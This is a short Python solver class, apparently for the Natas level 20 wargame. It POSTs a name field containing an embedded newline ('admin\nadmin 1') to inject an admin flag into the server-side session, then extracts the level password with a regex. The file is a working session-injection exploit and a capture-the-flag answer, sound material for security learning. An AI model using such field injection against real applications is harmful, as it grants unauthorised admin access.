import re
from .base_solver import NatasSolver

class Natas20Solver(NatasSolver):
    def solve(self) -> str:
        try:
            # First request to set admin value
            response = self.make_request(
                method="POST",
                data={"name": "admin\nadmin 1"}
            )

            # Second request to use injected session
            response = self.make_request()

            if "You are an admin" in response.text:
                match = re.findall(r"Password: (.*)</pre>", response.text)
                if match:
                    return match[0].strip()
                    
            raise ValueError("Could not get admin access")

        except Exception as e:
            raise RuntimeError(f"Failed to solve natas20: {str(e)}")